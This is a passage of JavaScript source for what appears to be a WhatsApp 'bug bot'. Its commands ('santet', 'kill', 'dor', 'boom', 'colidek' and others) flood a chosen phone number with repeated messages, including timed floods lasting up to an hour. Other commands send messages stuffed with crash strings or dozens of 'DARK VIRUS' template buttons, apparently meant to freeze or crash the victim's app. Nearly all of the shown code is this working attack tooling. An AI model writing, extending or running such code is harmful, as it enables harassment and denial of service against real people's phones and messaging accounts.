await allan.sendMessage(`${text}@s.whatsapp.net`, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(`${text}@s.whatsapp.net`, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(`${text}@s.whatsapp.net`, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
await allan.sendMessage(`${text}@s.whatsapp.net`, {text:"© ITSUKA MODS WA"},{quoted:asukonyol11})
txts = `SUCCES ✅`
itsuka.reply(txts)
break
//=============================================================================================================
case 'sendreaksi' : {
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
a = await allan.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
await allan.sendMessage(Pe, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(Pe, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(Pe, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(Pe, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(Pe, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(Pe, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(Pe, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(Pe, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(Pe, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(Pe, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(Pe, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(Pe, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(Pe, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(Pe, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(Pe, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(Pe, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(Pe, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(Pe, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(Pe, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(Pe, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(Pe, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(Pe, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(Pe, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(Pe, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(Pe, {text:"© ITSUKA MODS WA"}, {quoted: a})
txts = `SUCCES ✅`
itsuka.reply(txts)
await sleep(20)
}
break
//=============================================================================================================
case 'colidek' : {
a = await allan.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"}, {quoted: a})
await allan.sendMessage(m.chat, {text:"© ITSUKA MODS WA"}, {quoted: a})
itsuka.reply(`BUG COLI DEK`)
}
break
//=============================================================================================================
case 'catalog': {
var messa = await prepareWAMessageMedia({ image: thumb }, { upload: allan.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ "productMessage": { "product": { "productImage": messa.imageMessage, "productId": "99999999999999", "title": `© ITSUKA MODS WA ${buttonvirus}`, "description": `© ITSUKA MODS WA ${buttonvirus}`,"currencyCode": "IDR","footerText": `🔥🔥🔥🔥🔥`, "priceAmount1000": "10000000","productImageCount": 1,  "firstImageId": 1, "salePriceAmount1000": "10000000", "retailerId": `ISAL`,"url": "https://youtube.com/channel/UC7CtK1YjIz4jg_A7zIzSxzg" }, "businessOwnerJid": "6288286858385@s.whatsapp.net",  } }), { userJid: m.chat, quoted: m })
allan.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })}  
break
//=============================================================================================================
case 'santed30menit': 
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
a = await allan.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
b = {  key: {    fromMe: false,   participant: `0@s.whatsapp.net`,    ...({ remoteJid: "" })  },  message: {  "imageMessage": { "mimetype": "image/jpeg",  "caption": `© Itsuka MODS WA`, "jpegThumbnail": thumb }  }  }
itsuka.reply(`Target di santet selema 30 menit`)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
break
//=============================================================================================================
case 'santed1jam': 
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
a = await allan.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
b = { key: {    fromMe: false,   participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })  },  message: {  "imageMessage": {   "mimetype": "image/jpeg",  "caption": `© Itsuka MODS WA`,   "jpegThumbnail": thumb }  } }
itsuka.reply(`Target di santet selema 1 Jam`)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: a})
await sleep(30000)
allan.sendMessage(Pe, {text:"."}, {quoted: b})
await sleep(30000)
break
//=============================================================================================================
case 'jadivirtex':
if (!text) throw `MANA TEXT NYA KONTOL`
allan.sendMessage(m.chat, { text: `${text} ${virtexcrash}`, contextInfo:{"externalAdReply": {"title": ` ${virtexcrash}`,"body": `${virtexcrash}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": ``,"sourceUrl": "https://wa.me/stickerpack/StickerHeist"}}}, { quoted: m})
break
//=============================================================================================================
//=============================================================================================================
case 'kill':
if (!ItsukaAllanBae) return itsuka.reply(`sorry anda sepertinya bukan pemilik bot`)
if(!isGroup) return itsuka.reply(`wajib dalam grup`)
if (!q) return itsuka.reply(`Contoh ${prefix+command} 628xx`)
txts = `SUCCES ✅`
itsuka.reply(txts)
if (!q) return 
num = `${q}`+'@s.whatsapp.net'
jumlah = '20'
waktu = `4s`
for (let i = 0; i < jumlah; i++) {
allan.sendMessage(num, {
text: 'BUG BY ItsukaAllan', 
templateButtons: [
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `AKWOWK KASIAN️`, id: ``}},
{ quoted: lep }
]})}
await sleep(ms(waktu))
break
//=============================================================================================================
case 'santet':
case 'bug5':
if (!ItsukaAllanBae) return itsuka.reply(`sorry anda sepertinya bukan pemilik bot`)
if (!isGroup) return itsuka.reply(`wajib dalam grup`)
if (!q) return itsuka.reply(`Contoh ${prefix+command} 628xx`)
txts = `SUCCES ✅`
itsuka.reply(txts)
if (!q) return 
num = `${q}`+'@s.whatsapp.net'
jumlah = '10'
waktu = `4s`
for (let i = 0; i < jumlah; i++) {
 allan.sendMessage(num, {
text: 'BUG BY HimaruVipMods', 
templateButtons: [
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quoted: lep }
]})}
await sleep(ms(waktu))
break
//=============================================================================================================
case 'dor':
case 'bug10':
if (!ItsukaAllanBae) return itsuka.reply(`sorry anda sepertinya bukan pemilik bot`)
if (!isGroup) return itsuka.reply(`wajib dalam grup`)
if (!q) return itsuka.reply(`Contoh ${prefix+command} 628xx`)
txts = `SUCCES ✅`
itsuka.reply(txts)
if (!q) return 
num = `${q}`+'@s.whatsapp.net'
jumlah = '10'
waktu = `4s`
for (let i = 0; i < jumlah; i++) {
allan.sendMessage(num, {
text: 'BUG BY HimaruVipMods', 
templateButtons: [
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quoted: lep }
]})}
await sleep(ms(waktu))
break
//=============================================================================================================
case 'boom':
case 'bug100':
if (!ItsukaAllanBae) return itsuka.reply(`sorry anda sepertinya bukan pemilik bot`)
if (!isGroup) return itsuka.reply(`wajib dalam grup`)
if (!q) return itsuka.reply(`Contoh ${prefix+command} 628xx`)
txts = `SUCCES ✅`
itsuka.reply(txts)
if (!q) return 
num = `${q}`+'@s.whatsapp.net'
jumlah = '10'
waktu = `4s`
for (let i = 0; i < jumlah; i++) {
allan.sendMessage(num, {
text: 'BUG BY ItsukaAllan', 
templateButtons: [
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
   { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
